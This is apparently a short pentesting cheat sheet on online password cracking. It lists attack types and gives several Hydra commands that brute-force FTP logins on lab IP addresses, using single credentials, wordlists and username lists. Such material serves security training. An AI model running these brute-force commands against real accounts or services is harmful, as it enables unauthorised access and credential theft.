## 🔐 **Online-Password-Cracking**

### 💥 **Online Password Cracking**

Online password cracking involves attempting to gain access to accounts by trying multiple username and password combinations through web forms or services, often when password hashes are not accessible.

---

### 🧠 **Types of Online Password Cracking Attacks**

### 🟢 **Passive Online**

- **Sniffing:** Intercepting data packets to capture passwords.
- **Man-in-the-Middle:** Intercepting and potentially altering communication between client and server.

### 🔴 **Active Online**

- **Hash Injection:** Injecting password hashes into authentication systems if feasible.
- **Guessing:** Attempting common or likely username-password combinations.
- **Trojan / Keylogger:** Installing malware to capture keystrokes or credentials.

---

### 📂 **Wordlists for Online Password Cracking**

Attackers typically use precompiled wordlists for usernames and passwords to speed up guessing attacks:

### **FTP**

These commands demonstrate how to use Hydra for password cracking on FTP servers using username and password combinations.

### **Single Username and Password**

```bash
hydra -l administrator -p @rmour123 ftp://192.168.1.63
hydra -l user -p @rmour123 ftp://192.168.1.62

```

### **Single Username with Password List**

```bash
hydra -l administrator -P /opt/password.txt ftp://192.168.1.63
hydra -l user -P /opt/darkweb2017-top100.txt ftp://192.168.1.51 -t 10

```

### **Username List with Password List**

```bash
hydra -L /opt/top-usernames-shortlist.txt -P /opt/darkweb2017-top100.txt 192.168.1.51 ftp -t 10
hydra -L /opt/username.txt -P /opt/password.txt ftp://192.168.1.63 -t 64

```
